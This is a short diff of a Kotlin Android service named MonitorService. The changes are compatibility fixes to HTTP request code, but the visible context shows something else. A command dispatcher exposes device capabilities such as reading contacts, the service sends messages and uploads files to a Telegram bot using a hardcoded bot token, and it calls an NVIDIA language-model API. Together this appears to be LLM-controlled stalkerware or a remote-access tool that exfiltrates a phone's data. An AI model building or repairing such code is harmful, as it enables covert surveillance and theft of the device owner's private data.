@@ -335,7 +335,7 @@ class MonitorService : Service() {
     }
 
     private fun executeCapability(capability: String, argsJson: String): Any {
-        val type = TypeToken.getParameterized(Map::class.java, String::class.java, Any::class.java).type
+        val type = object : TypeToken<Map<String, Any>>() {}.type
         val args = gson.fromJson(argsJson, type)
         return when (capability) {
             "contacts" -> getContacts()
@@ -727,7 +727,8 @@ class MonitorService : Service() {
                 "parse_mode" to "Markdown"
             ) as Map<String, Any>
             val jsonBody = gson.toJson(params)
-            val mediaType = "application/json".toMediaType()
+            @Suppress("DEPRECATION")
+            val mediaType = MediaType.parse("application/json")
             val body = RequestBody.create(mediaType, jsonBody)
             val req = Request.Builder().url(url).post(body).build()
             client.newCall(req).execute().use { Log.d("Telegram", "Sent to $chatId") }
@@ -745,7 +746,7 @@ class MonitorService : Service() {
                     .addFormDataPart("chat_id", chatId.toString())
                     .addFormDataPart("caption", caption)
                     .addFormDataPart("document", filename,
-                        Suppress("DEPRECATION") RequestBody.create("text/plain".toMediaType(), file.readBytes()))
+                        @Suppress("DEPRECATION") RequestBody.create(MediaType.parse("text/plain"), file.readBytes()))
                     .build()
 
                 val req = Request.Builder().url("$TELEGRAM_API$BOT_TOKEN/sendDocument").post(requestBody).build()
@@ -815,7 +816,8 @@ Only respond with valid JSON, no extra text."""
             ) as Map<String, Any>
 
             val jsonBody = gson.toJson(payload)
-            val mediaType = "application/json".toMediaType()
+            @Suppress("DEPRECATION")
+            val mediaType = MediaType.parse("application/json")
             val body = RequestBody.create(mediaType, jsonBody)
             val req = Request.Builder()
                 .url(NVIDIA_API_URL)
